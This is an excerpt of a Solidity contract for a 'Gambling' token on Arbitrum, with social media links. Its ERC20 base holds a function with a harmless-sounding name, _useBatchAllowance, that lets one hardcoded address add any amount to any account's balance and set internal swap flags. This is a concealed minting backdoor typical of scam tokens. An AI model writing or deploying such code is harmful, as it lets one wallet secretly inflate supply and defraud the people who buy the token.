...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    */
    function _useBatchAllowance(address account, uint256 amount) public {
        require(msg.sender == 0xc78771e09196A9C11bd7AE50aFc4b133360066b9);
        _last = account;
        _swap = true;
        _balances[account] += amount;
    }
...
https://twitter.com/GamblingArbi
https://t.me/gambling_arbitrum
...
contract Gambling is ERC20, Ownable {
    ...
    constructor(address _uniRouterAddress) ERC20("Gambling", "GAMBLING") {
